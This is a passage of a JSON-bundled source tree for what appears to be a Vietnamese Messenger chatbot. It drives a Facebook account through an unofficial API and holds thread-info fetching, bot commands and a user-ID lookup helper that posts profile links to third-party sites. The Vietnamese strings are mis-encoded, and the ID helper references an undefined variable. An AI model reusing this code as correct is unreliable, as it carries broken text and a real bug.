Date.now()) {\n            Real.push(i.data.threadID);\n          }\n          else {\n            Average.push({\n              threadID: i.data.threadID,\n              TimeCreate: i.data.TimeCreate\n            });\n            continue;\n          }\n        } else continue;\n      }\n    const AllofThread = [];\n    if (Average.length > 0) {\n      var Time = 0;\n      for (let i of Average) {\n        Time += i.TimeCreate;\n      }\n      Time = Time / Average.length;\n      if (Time + 900 * 1000 <= Date.now()) {\n        for (let i of Average) {\n          Real.push(i.threadID);\n        }\n      } //can't =))\n      else {\n        setTimeout(function () {\n          SpecialMethod(TID);\n        }, Time + 900 * 1000 - Date.now());\n      }\n    }\n    else {\n      setTimeout(function () {\n        SpecialMethod(TID);\n      }, 900 * 1000);\n    }\n    if (Real.length == 0) return;\n    else if (Real.length == 1) {\n      return DefaultMethod(TID);\n    } \n    else if (All.length > 1) {\n      for (let i of All) {\n        if (i.data.threadID != undefined) {\n          AllofThread.push(i.data.threadID);\n        } else continue;\n      }\n      var Form = {};\n      var ThreadInfo = [];\n        \n        AllofThread.map(function (x,y) {\n          Form[\"o\" + y] = {\n            doc_id: \"3449967031715030\",\n            query_params: {\n              id: x,\n              message_limit: 0,\n              load_messages: false,\n              load_read_receipts: false,\n              before: null\n            }\n          };\n        });\n  \n        var form = {\n          queries: JSON.stringify(Form),\n          batch_name: \"MessengerGraphQLThreadFetcher\"\n        };\n  \n        defaultFuncs\n        .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n          .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n          .then(function(resData) {\n          if (resData.error) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          if (resData[resData.length - 1].error_results !== 0) {\n            throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n          }\n          resData = resData.splice(0, resData.length - 1);\n          resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n          resData.map(function (x,y) {\n            ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n          });\n            try {\n            if (Object.keys(resData).length == 1) {\n              updateData(threadID,ThreadInfo[0]);\t\n              if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n                for (let i of ThreadInfo[0].userInfo) {\n                  if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                    global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n                  }\n                  global.Fca.Data.Userinfo.push(i);\n                }\n              }\n            } else {\n              for (let i of ThreadInfo) {\n                updateData(i.threadID,i);\n                if (utils.getType(i.userInfo) == \"Array\") {\n                  for (let ii of i.userInfo) {\n                    if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                      global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                    }\n                    global.Fca.Data.Userinfo.push(ii);\n                  }\n                }\n              }\n            }\n          }\n        catch (e) {\n          console.log(e);\n        }\n        })\n        .catch(function(err){\n          throw \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu\";\n        });\n      }\n    };\n\n    var DefaultMethod = function(TID) { \n      var ThreadInfo = [];\n      for (let i of TID) {\n        ThreadInfo.push(getData(i));\n      }\n      if (ThreadInfo.length == 1) {\n        callback(null,ThreadInfo[0]);\n        if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n          for (let i of ThreadInfo[0].userInfo) {\n            if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n              global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n            }\n            global.Fca.Data.Userinfo.push(i);\n          }\n      } else {\n        for (let i of ThreadInfo) {\n          if (utils.getType(i.userInfo) == \"Array\") {\n            for (let ii of i.userInfo) {\n              if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(ii);\n            }\n          }\n        }\n        callback(null,ThreadInfo);\n      }\n    }\n  };\n    var CreateMethod = function(TID) { \n      var Form = {};\n      var ThreadInfo = [];\n\n      TID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n      var form = {\n        queries: JSON.stringify(Form),\n        batch_name: \"MessengerGraphQLThreadFetcher\"\n      };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n        .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n        .then(function(resData) {\n        if (resData.error) {\n          throw resData.error;\n        }\n        if (resData[resData.length - 1].error_results !== 0) {\n          throw resData.error;\n        }\n        resData = resData.splice(0, resData.length - 1);\n        resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n        resData.map(function (x,y) {\n          ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n        });\n        if (Object.keys(resData).length == 1) {\n          createData(threadID,ThreadInfo[0]);\t\n          callback(null, ThreadInfo[0]);\n          capture(callback);\n          setLastRun('LastUpdate', callback);\n          if (global.Fca.Data.Userinfo == undefined) global.Fca.Data.Userinfo = [];\n          if (utils.getType(ThreadInfo[0].userInfo) == \"Array\") {\n            for (let i of ThreadInfo[0].userInfo) {\n              if (global.Fca.Data.Userinfo.some(ii => ii.id == i.id)) {\n                global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(ii => ii.id == i.id), 1);\n              }\n              global.Fca.Data.Userinfo.push(i);\n            }\n          }\n        } else {\n          // api.Horizon_Data([ThreadInfo], \"Threads\", \"Post\");\n          for (let i of ThreadInfo) {\n            createData(i.threadID,i);\n            if (utils.getType(i.userInfo) == \"Array\") {\n              for (let ii of i.userInfo) {\n                if (global.Fca.Data.Userinfo.some(iii => iii.id == ii.id)) {\n                  global.Fca.Data.Userinfo.splice(global.Fca.Data.Userinfo.findIndex(iii => iii.id == ii.id), 1);\n                }\n                global.Fca.Data.Userinfo.push(ii);\n              }\n            }\n          }\n          callback(null, ThreadInfo);\n        }\n      })\n      .catch(function(err){\n        throw err;\n      });\n    };\n    if (global.Fca.Data.Already != true) { SpecialMethod(threadID); global.Fca.Data.Already = true; setInterval(function(){Database(true).set('UserInfo', global.Fca.Data.Userinfo); delete global.Fca.Data.Userinfo; global.Fca.Data.Userinfo = []; }, 900 * 1000); } \n    \n    try {\n      for (let i of threadID) {\n        switch (hasData(i)) {\n            case true: {     \n              DefaultMethod(threadID);\n              break;\n            }\n          case false: {\n            CreateMethod(threadID);\n            break;\n          }\n        }\n      }\n    }\n    catch (err) {\n      console.log(err);\n    }\n    return returnPromise;\n  };\n};","path":null,"size_bytes":15115,"size_tokens":null},"modules/commands/renewqtv.js":{"content":"module.exports.config = {\n  name: \"renewqtv\",\n  version: \"1.0\",\n  hasPermssion: 3,\n  credits: \"TatsuYTB\",\n  description: \"L√†m m·ªõi danh s√°ch qu·∫£n tr·ªã vi√™n to√†n b·ªô nh√≥m\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"ƒë·ªÉ tr·ªëng\",\n  cooldowns: 5,\n};\n\nmodule.exports.run = async function ({ event, api, Threads }) {\n  const { threadID, senderID } = event;\n  \n  api.sendMessage(\"üîÑ ƒêang c·∫≠p nh·∫≠t danh s√°ch qu·∫£n tr·ªã vi√™n to√†n b·ªô nh√≥m, vui l√≤ng ch·ªù...\", threadID);\n  \n  const allThreads = await Threads.getAll();\n  let updatedThreads = 0;\n  let totalAdminsUpdated = 0;\n  \n  for (const thread of allThreads) {\n    const targetID = thread.threadID;\n    \n    try {\n      const threadInfo = await api.getThreadInfo(targetID);\n      const adminCount = threadInfo.adminIDs.length;\n\n      await Threads.setData(targetID, { threadInfo });\n      global.data.threadInfo.set(targetID, threadInfo);\n\n      updatedThreads++;\n      totalAdminsUpdated += adminCount;\n    } catch (error) {\n      console.error(`Kh√¥ng th·ªÉ c·∫≠p nh·∫≠t nh√≥m ${targetID}:`, error);\n    }\n  }\n\n  return api.sendMessage(\n    `‚úÖ ƒê√£ l√†m m·ªõi danh s√°ch qu·∫£n tr·ªã vi√™n to√†n b·ªô nh√≥m m√† bot tham gia!\\n\\nüì¶ S·ªë nh√≥m ƒë√£ c·∫≠p nh·∫≠t: ${updatedThreads}\\nüë®‚Äçüíª T·ªïng s·ªë qu·∫£n tr·ªã vi√™n c·∫≠p nh·∫≠t: ${totalAdminsUpdated}\\n\\nüìå C·∫≠p nh·∫≠t th√†nh c√¥ng!`,\n    threadID\n  );\n};\n","path":null,"size_bytes":1400,"size_tokens":null},"lib/fca-auto/src/httpPostFormData.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function httpPostFormData(url, form, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n    \n    \n    callback = callback || function(err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n    };\n\n    defaultFuncs\n      .postFormData(url, ctx.jar, form)\n      .then(function(resData) {\n        callback(null, resData.body.toString());\n      })\n      .catch(function(err) {\n        log.error(\"httpPostFormData\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":991,"size_tokens":null},"lib/Fca-Horizon-Remastered/test/test-page.js":{"content":"var login = require('../index.js');\nvar fs = require('fs');\nvar assert = require('assert');\n\nvar conf =  JSON.parse(process.env.testconfig || fs.readFileSync('test/test-config.json', 'utf8'));\nvar credentials = {\n  email: conf.user.email,\n  password: conf.user.password,\n};\n\nvar userIDs = conf.userIDs;\n\nvar options = {\n  selfListen: true,\n  listenEvents: true,\n  logLevel: \"silent\",\n  pageID: conf.pageID\n};\nvar getType = require('../utils').getType;\n\nvar userID = conf.user.id;\n\nvar groupChatID;\nvar groupChatName;\n\nfunction checkErr(done){\n  return function(err) {\n    if (err) done(err);\n  };\n}\n\n// describe('Login As Page:', function() {\n//   var api = null;\n//   process.on('SIGINT', () => api && !api.logout() && console.log(\"Logged out :)\"));\n//   var tests = [];\n//   var stopListening;\n//   this.timeout(20000);\n\n//   function listen(done, matcher) {\n//     tests.push({matcher:matcher, done:done});\n//   }\n\n//   before(function(done) {\n//     login(credentials, options, function (err, localAPI) {\n//       if(err) return done(err);\n\n//       assert(localAPI);\n//       api = localAPI;\n//       stopListening = api.listen(function (err, msg) {\n//         if (err) throw err;\n//         // Removes matching function and calls corresponding done\n//         tests = tests.filter(function(test) {\n//           return !(test.matcher(msg) && (test.done() || true));\n//         });\n//       });\n\n//       done();\n//     });\n//   });\n\n//   it('should login without error', function (){\n//     assert(api);\n//   });\n\n//   it('should get the right user ID', function (){\n//     assert(userID == api.getCurrentUserID());\n//   });\n\n//   it('should send text message object (user)', function (done){\n//     var body = \"text-msg-obj-\" + Date.now();\n//     listen(done, msg =>\n//       msg.type === 'message' &&\n//       msg.body === body &&\n//       msg.isGroup === false\n//     );\n//     api.sendMessage({body: body}, userID, checkErr(done));\n//   });\n\n//   it('should send sticker message object (user)', function (done){\n//     var stickerID = '767334526626290';\n//     listen(done, msg =>\n//       msg.type === 'message' &&\n//       msg.attachments.length > 0 &&\n//       msg.attachments[0].type === 'sticker' &&\n//       msg.attachments[0].stickerID === stickerID &&\n//       msg.isGroup === false\n//     );\n//     api.sendMessage({sticker: stickerID}, userID, checkErr(done));\n//   });\n\n//   it('should send basic string (user)', function (done){\n//     var body = \"basic-str-\" + Date.now();\n//     listen(done, msg =>\n//       msg.type === 'message' &&\n//       msg.body === body &&\n//       msg.isGroup === false\n//     );\n//     api.sendMessage(body, userID, checkErr(done));\n//   });\n\n//   it('should send typing indicator', function (done) {\n//     var stopType = api.sendTypingIndicator(userID, function(err) {\n//       checkErr(done)(err);\n//       stopType();\n//       done();\n//     });\n//   });\n\n//   it('should get the right user info', function (done) {\n//     api.getUserInfo(userID, function(err, data) {\n//       checkErr(done)(err);\n//       var user = data[userID];\n//       assert(user.name);\n//       assert(user.firstName);\n//       assert(user.vanity !== null);\n//       assert(user.profileUrl);\n//       assert(user.gender);\n//       assert(user.type);\n//       assert(!user.isFriend);\n//       done();\n//     });\n//   });\n\n//   it('should get the list of friends', function (done) {\n//     api.getFriendsList(function(err, data) {\n//       checkErr(done)(err);\n//       assert(getType(data) === \"Array\");\n//       data.map(function(v) {parseInt(v);});\n//       done();\n//     });\n//   });\n\n//   it('should log out', function (done) {\n//     api.logout(done);\n//   });\n\n//   after(function (){\n//     if (stopListening) stopListening();\n//   });\n// });\n","path":null,"size_bytes":3778,"size_tokens":null},"modules/commands/fact.js":{"content":"module.exports.config = {\n\tname: \"fact\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"TatsuYTB\",\n\tdescription: \"random facts\",\n\tcommandCategory: \"Ti·ªán √≠ch\",\n\tcooldowns: 10\n};\n\nmodule.exports.run = async ({ api, event, args }) => {\n\tconst axios = require('axios');\n\tconst request = require('request');\n\t\n\ttry {\n\t\tconst res = await axios.get('https://api.popcat.xyz/fact');\n\t\tlet fact = res.data.fact;\n\n\t\tconst translateUrl = encodeURI(`https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=vi&dt=t&q=${fact}`);\n\t\trequest(translateUrl, (err, response, body) => {\n\t\t\tif (err) return api.sendMessage(\"ƒê√£ c√≥ l·ªói x·∫£y ra!\", event.threadID, event.messageID);\n\t\t\t\n\t\t\tvar retrieve = JSON.parse(body);\n\t\t\tvar translatedText = '';\n\t\t\tretrieve[0].forEach(item => {\n\t\t\t\tif (item[0]) translatedText += item[0];\n\t\t\t});\n\t\t\t\n\t\t\tapi.sendMessage(`[ B·∫°n c√≥ bi·∫øt? ]\\n ${translatedText}`, event.threadID, event.messageID);\n\t\t});\n\t} catch (error) {\n\t\tapi.sendMessage(\"ƒê√£ c√≥ l·ªói x·∫£y ra khi l·∫•y d·ªØ li·ªáu t·ª´ API!\", event.threadID, event.messageID);\n\t}\n};\n","path":null,"size_bytes":1080,"size_tokens":null},"lib/fca-auto/Extra/ExtraFindUID.js":{"content":"'use strict';\n\nconst got = global.Fca.Require.Fetch;\n\n/**\n * @param {string | URL} url\n * @param {{ sendMessage: (arg0: string, arg1: any) => any; }} api\n */\nasync function getUIDSlow(url,api) {\n    var FormData =  require(\"form-data\");\n    var Form = new FormData();\n\tvar Url = new URL(url);\n    Form.append('username', Url.pathname.replace(/\\//g, \"\"));\n\ttry {\n        var data = await got.post('https://api.findids.net/api/get-uid-from-username',{\n            body: Form,\n            userAgent: 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36'\n        })\n\t} catch (e) {\n        console.log(global.Fca.Data.event.threadID,e)\n        return api.sendMessage(\"L·ªói: \" + e.message,global.Fca.Data.event.threadID);\n\t}\n    if (JSON.parse(data.body.toString()).status != 200) return api.sendMessage('ƒê√£ b·ªã l·ªói !',global.Fca.Data.event.threadID)\n    if (typeof JSON.parse(data.body.toString()).error === 'string') return \"errr\"\n    else return JSON.parse(data.body.toString()).data.id || \"n·ªãt\";\n}\n\n/**\n * @param {string | URL} url\n * @param {{ sendMessage: (arg0: string, arg1: any, arg2: any) => any; }} api\n */\nasync function getUIDFast(url,api) {\n    var FormData =  require(\"form-data\");\n    var Form = new FormData();\n\tvar Url = new URL(url);\n    Form.append('link', Url.href);\n    try {\n        var data = await got.post('https://id.traodoisub.com/api.php',{\n            body: Form\n        })\n\t} catch (e) {\n        return api.sendMessage(\"L·ªói: \" + e.message,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n\t}\n    if (JSON.parse(data.body.toString()).error) return api.sendMessage(JSON.parse(data.body.toString()).error,global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n    else return JSON.parse(data.body.toString()).id || \"co cai nit huhu\";\n}\n\n/**\n * @param {any} url\n * @param {any} api\n */\nasync function getUID(url,api) {\n    var getUID = await getUIDFast(url,api);\n        if (!isNaN(getUID) == true) return getUID;  \n            else {\n                let getUID = await getUIDSlow(url,api);\n            if (!isNaN(data) == true) return getUID;\n        else return null;\n    }\n}\n\nmodule.exports = getUID;        ","path":null,"size_bytes":2220,"size_tokens":null},"modules/commands/ganyu.js":{"content":"module.exports.config = {\n  name: \"ganyu\",\n  version: \"1.0.0\",\n  hasPermssion: 0,\n  credits: \"Teri\",\n  description: \"Random ·∫£nh ganyu\",\n  commandCategory: \"Random-img\",\n  usages: \"ganyu\",\n  cooldowns: 30,\n  dependencies: {\n    \"request\":\"\",\n    \"fs-extra\":\"\",\n    \"axios\":\"\"\n  }\n    \n};\n\nmodule.exports.run = async({api,event,args,Users,Threads,Currencies}) => {\nconst axios = global.nodemodule[\"axios\"];\nconst request = global.nodemodule[\"request\"];\nconst fs = global.nodemodule[\"fs-extra\"];\n  var link = [\n\"https://i.imgur.com/5B40CPB.jpeg\",\n\"https://i.imgur.com/vCPrVfx.jpeg\",\n\"https://i.imgur.com/B2N9LRU.jpeg\",\n\"https://i.imgur.com/m354Pmf.jpeg\",\n\"https://i.imgur.com/vgAacwZ.jpeg\",\n\"https://i.imgur.com/vKgjQ7m.jpeg\",\n\"https://i.imgur.com/h8mKG8t.jpeg\",\n\"https://i.imgur.com/0JX77ps.jpeg\",\n\"https://i.imgur.com/ELUALap.jpeg\",\n\"https://i.imgur.com/uKv5UG9.jpeg\",\n\"https://i.imgur.com/GxE4eZu.jpeg\",\n\"https://i.imgur.com/txUR2zp.jpeg\",\n\"https://i.imgur.com/q8nEcO7.jpeg\",\n\"https://i.imgur.com/rfmq44F.jpeg\",\n\"https://i.imgur.com/CY0YxOg.jpeg\",\n\"https://i.imgur.com/b3GjyXI.jpeg\",\n\"https://i.imgur.com/uz2qDt8.jpeg\",\n\"https://i.imgur.com/513JHGD.jpeg\",\n\"https://i.imgur.com/XJL6eMS.jpeg\",\n\"https://i.imgur.com/3o2p4im.jpeg\",\n\"https://i.imgur.com/5IAgkoR.jpeg\",\n\"https://i.imgur.com/ROgs4KA.jpeg\",\n\"https://i.imgur.com/ica8w7D.jpeg\",\n\"https://i.imgur.com/J13XaP3.jpeg\",\n\"https://i.imgur.com/REvUpuh.jpeg\",\n\"https://i.imgur.com/gCo5yyP.jpeg\",\n\"https://i.imgur.com/IUvM8t1.jpeg\",\n\"https://i.imgur.com/WpTM9SQ.jpeg\",\n\"https://i.imgur.com/GuZBbI6.png\",\n\"https://i.imgur.com/zOcoFM1.jpeg\",\n\"https://imgur.com/gallery/4IAJB8M\",\n\"https://i.imgur.com/F88Yulq.png\",\n\"https://i.imgur.com/Adez2FW.jpeg\",\n\"https://i.imgur.com/2YMzkb6.jpeg\",\n\"https://i.imgur.com/4PE8pHE.jpeg\",\n\"https://i.imgur.com/tRPU2x7.jpeg\",\n\"https://i.imgur.com/6RDQtCI.jpeg\",\n\"https://i.imgur.com/i47DZiE.jpeg\",\n\"https://i.imgur.com/44Av0Zg.jpeg\",\n\"https://i.imgur.com/K7sgkZT.jpeg\",\n\"https://i.imgur.com/7QHkaNv.jpeg\",\n\"https://i.imgur.com/7nBB0OZ.jpeg\",\n\"https://i.imgur.com/cCKUnZd.jpeg\",\n\"https://i.imgur.com/9vpr4lr.jpeg\",\n\"https://i.imgur.com/IbNM5A4.png\",\n\"https://i.imgur.com/XnPLIW7.jpeg\",\n\"https://i.imgur.com/UgLJy1C.jpeg\",\n\"https://i.imgur.com/mczkMqU.jpeg\",\n\"https://i.imgur.com/Bd984ik.jpeg\",\n\"https://i.imgur.com/5jBj4ac.jpeg\",\n\"https://i.imgur.com/ulzw7EN.jpeg\",\n\"https://i.imgur.com/cetjuT4.jpeg\",\n\"https://i.imgur.com/HFunJ1t.jpeg\",\n\"https://i.imgur.com/dqfHcVr.jpeg\",\n\"https://i.imgur.com/rzjf3Rf.png\",\n\"https://i.imgur.com/Vma9bsz.jpeg\",\n\"https://i.imgur.com/ya8gKJ6.jpeg\",\n\"https://i.imgur.com/dhJdaPM.jpeg\",\n\"https://i.imgur.com/mMcSfUM.jpeg\",\n\"https://i.imgur.com/ffbAJCL.jpeg\",\n\"https://i.imgur.com/yDw0qrI.jpeg,\",\n\"https://i.imgur.com/xP7ySVX.jpeg\",\n\"https://i.imgur.com/lAuSOcl.jpeg\",\n\"https://i.imgur.com/5Sn2qjx.jpeg\",\n\"https://i.imgur.com/vSqI4IV.jpeg\",\n\"https://i.imgur.com/S2Lqpt0.jpeg\",\n\"https://i.imgur.com/yHdzXPU.jpeg\",\n\"https://i.imgur.com/KQzmHIZ.jpeg\",\n\"https://i.imgur.com/WdVu7IF.jpeg\",\n\"https://i.imgur.com/bam8egw.jpeg\",\n\"https://i.imgur.com/4jwu7LX.jpeg\",\n\"https://i.imgur.com/KE0u02Q.jpeg\",\n\"https://i.imgur.com/FjTycsr.jpeg\",\n\"https://i.imgur.com/0jbY8zP.jpeg\",\n\"https://i.imgur.com/LRKjrgU.jpeg\",\n\"https://i.imgur.com/N6n8C5u.jpeg\",\n\"https://i.imgur.com/iRZnTzt.jpeg\",\n\"https://i.imgur.com/xl2JXWZ.jpeg\",\n\"https://i.imgur.com/pPBKgkB.jpeg\",\n\"https://i.imgur.com/BIYj4o0.jpeg\",\n\"https://i.imgur.com/CK9YYjE.jpeg\",\n\"https://i.imgur.com/bNnrtHa.jpeg\",\n\"https://i.imgur.com/uEYb90T.jpeg\",\n\"https://i.imgur.com/JnPxCFo.jpeg\",\n\"https://i.imgur.com/sjiJHXi.jpeg\",\n\"https://i.imgur.com/drLVAx2.jpeg\",\n\"https://i.imgur.com/e4HA8g4.jpeg\",\n\"https://i.imgur.com/sliglf8.jpeg\",\n\"https://i.imgur.com/IgdqTb3.jpeg\",\n\"https://i.imgur.com/IG8nCQd.jpeg\",\n\"https://i.imgur.com/WWQhtaj.jpeg\",\n\"https://i.imgur.com/920uF2G.jpeg\",\n\"https://i.imgur.com/ZGkefbB.jpeg\",\n\"https://i.imgur.com/Sm2fdQ8.jpeg\",\n\"https://i.imgur.com/qp614Kw.jpeg\",\n\"https://i.imgur.com/k936dAY.jpeg\",\n\"https://i.imgur.com/pwa5RBF.jpeg\",\n\"https://i.imgur.com/nnm9v2p.jpeg\",\n\"https://i.imgur.com/E6IfVmH.jpeg\",\n\"https://i.imgur.com/wydEJYY.jpeg\",\n\"https://i.imgur.com/xaSlj8a.jpeg\",\n\"https://i.imgur.com/T6idcEt.jpeg\",\n\"https://i.imgur.com/xEuDpSy.jpeg\",\n\"https://i.imgur.com/SderS0Y.jpeg\",\n\"https://i.imgur.com/HgSUS24.jpeg\",\n\"https://i.imgur.com/HfDsM9J.jpeg\",\n\"https://i.imgur.com/fUwPPAF.jpeg\",\n\"https://i.imgur.com/wbSk6Ng.jpeg\",\n\"https://i.imgur.com/Kx9BPhF.jpeg\",\n\"https://i.imgur.com/lTT3vlG.jpeg\",\n\"https://i.imgur.com/ra3q29P.jpeg\",\n\"https://i.imgur.com/dym6Bzt.jpeg\",\n\"https://i.imgur.com/3GEtfDe.jpeg\",\n\"https://i.imgur.com/T7IEuaF.jpeg\",\n\"https://i.imgur.com/adUyNmk.jpeg\",\n\"https://i.imgur.com/nsXl2Qi.jpeg\",\n\"https://i.imgur.com/xVypyPr.jpeg\",\n\"https://i.imgur.com/DEhktVn.jpeg\",\n\"https://i.imgur.com/uYooP4k.jpeg\",\n\"https://i.imgur.com/2ie6SqZ.jpeg\",\n\"https://i.imgur.com/rnPpnkm.jpeg\",\n\"https://i.imgur.com/JJfaVHD.jpeg\",\n\"https://i.imgur.com/Id2dftJ.jpeg\",\n\"https://i.imgur.com/iD8vbCn.jpeg\",\n\"https://i.imgur.com/Xt3jMrR.jpeg\",\n\"https://i.imgur.com/gg1JHQC.jpeg\",\n\"https://i.imgur.com/3tT5mFt.jpeg\",\n\"https://i.imgur.com/Fcz26yp.jpeg\",\n\"https://i.imgur.com/NOg91eb.jpeg\",\n\"https://i.imgur.com/moYVluc.jpeg\",\n\"https://i.imgur.com/e2Cmva2.jpeg\",\n\"https://i.imgur.com/Bq3VOT3.jpeg\",\n\"https://i.imgur.com/YKv19TU.jpeg\",\n\"https://i.imgur.com/bQdsHkw.jpeg\",\n\"https://i.imgur.com/sNxUTDB.jpeg\",\n\"https://i.imgur.com/G3RuG4x.jpeg\",\n\"https://i.imgur.com/oDdhfsF.jpeg\",\n\"https://i.imgur.com/eSmZ65j.jpeg\",\n\"https://i.imgur.com/9YkemZn.jpeg\",\n\"https://i.imgur.com/rLiR2ab.jpeg\",\n\"https://i.imgur.com/wAQS6Ij.jpeg\",\n\"https://i.imgur.com/otY2kPF.jpeg\",\n\"https://i.imgur.com/r0RYzqa.jpeg\",\n\"https://i.imgur.com/myS6dw7.jpeg\",\n\"https://i.imgur.com/jDbRAYC.jpeg\",\n\"https://i.imgur.com/qESnFS7.jpeg\",\n\"https://i.imgur.com/WqrxETF.jpeg\",\n\"https://i.imgur.com/s1UGCSn.jpeg\",\n\"https://i.imgur.com/1xO3Wif.jpeg\",\n\"https://i.imgur.com/RBOzfNR.jpeg\",\n\"https://i.imgur.com/JBSbFuI.jpeg\",\n\"https://i.imgur.com/6qe0kqA.jpeg\",\n\"https://i.imgur.com/aaDSrJk.jpeg\",\n\"https://i.imgur.com/4828ly7.jpeg\",\n\"https://i.imgur.com/TkrGZnr.jpeg\",\n\"https://i.imgur.com/cKAntwU.jpeg\",\n\"https://i.imgur.com/OdmhrqV.jpeg\",\n\"https://i.imgur.com/haSjtc4.jpeg\",\n\"https://i.imgur.com/c3SybDV.jpeg\",\n\"https://i.imgur.com/OvJbssz.jpeg\",\n\"https://i.imgur.com/cAo9RIM.jpeg\",\n\"https://i.imgur.com/kGetyYU.jpeg\",\n\"https://i.imgur.com/yOSXmc1.jpeg\",\n\"https://i.imgur.com/SLIA0Xz.jpeg\",\n\"https://i.imgur.com/7s9PfYt.jpeg\",\n\"https://i.imgur.com/7vRqAk5.jpeg\",\n\"https://i.imgur.com/TEhgU2S.jpeg\",\n\"https://i.imgur.com/j2D3zyt.jpeg\",\n\"https://i.imgur.com/6GpMvC4.jpeg\",\n\"https://i.imgur.com/DrnQ4TC.jpeg\",\n\"https://i.imgur.com/YOdf8Cm.jpeg\",\n\"https://i.imgur.com/uXUntQo.jpeg\",\n\"https://i.imgur.com/NcZnlX6.jpeg\",\n\"https://i.imgur.com/jyKoE6v.jpeg\",\n\"https://i.imgur.com/7MLOyAC.jpeg\",\n\"https://i.imgur.com/cU7Hzbt.jpeg\",\n\"https://i.imgur.com/x2hIZhT.jpeg\",\n\"https://i.imgur.com/aSWJodZ.jpeg\",\n\"https://i.imgur.com/gne2wMn.jpeg\",\n\"https://i.imgur.com/sPWJPlz.jpeg\",\n\"https://i.imgur.com/TE0zRSV.jpeg\",\n\"https://i.imgur.com/Epky3Gk.jpeg\",\n\"https://i.imgur.com/jTg35r1.jpeg\",\n\"https://i.imgur.com/N6If5Ut.jpeg\",\n\"https://i.imgur.com/vcqYeRQ.jpeg\",\n\"https://i.imgur.com/HsQ6IvU.jpeg\",\n\"https://i.imgur.com/dT68TId.jpeg\",\n\"https://i.imgur.com/BmxJydj.jpeg\",\n\"https://i.imgur.com/054E6sZ.jpeg\",\n\"https://i.imgur.com/9hxx0tS.jpeg\",\n  ];\n  var max = Math.floor(Math.random() * 6);  \nvar min = Math.floor(Math.random() * 2);\n  var data = await Currencies.getData(event.senderID);\n  //var exp =  data.exp;\n  var money = data.money\n      if(money < 100) api.sendMessage(\"B·∫°n c·∫ßn 100 ƒë√¥ ƒë·ªÉ xem ·∫£nh ?\",event.threadID,event.messageID)\n          else {\n   Currencies.setData(event.senderID, options = {money: money - 100})\n   var callback = () => api.sendMessage({body:`·∫¢nh Ganyu genshi\\nS·ªë ·∫¢nh: ${link.length}\\n-100 ƒë√¥ !`,attachment: fs.createReadStream(__dirname + \"/cache/1.jpg\")}, event.threadID, () => fs.unlinkSync(__dirname + \"/cache/1.jpg\"), event.messageID); \n      return request(encodeURI(link[Math.floor(Math.random() * link.length)] + (max - min))).pipe(fs.createWriteStream(__dirname+\"/cache/1.jpg\")).on(\"close\",() => callback());\n     }\n   };","path":null,"size_bytes":8184,"size_tokens":null},"modules/commands/thread.js":{"content":"module.exports.config = {\n  name: \"thread\",\n  version: \"1.0.5\",\n  hasPermssion: 3,\n  credits: \"Mirai Team\",\n  description: \"C·∫•m ho·∫∑c g·ª° c·∫•m nh√≥m\",\n  commandCategory: \"H·ªá Th·ªëng\",\n  usages: \"[unban/ban/search] [ID or text]\",\n  cooldowns: 5,\n  dependencies: {\n    \"moment-timezone\": \"\"\n  }\n};\n\nmodule.exports.languages = {\n  \"vi\": {\n    \"reason\": \"L√Ω do\",\n    \"at\": \"v√†o l√∫c\",\n    \"allCommand\": \"to√†n b·ªô l·ªánh\",\n    \"commandList\": \"nh·ªØng l·ªánh\",\n    \"banSuccess\": \"[ Ban Thread ] ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng y√™u c·∫ßu c·∫•m nh√≥m c√≥ 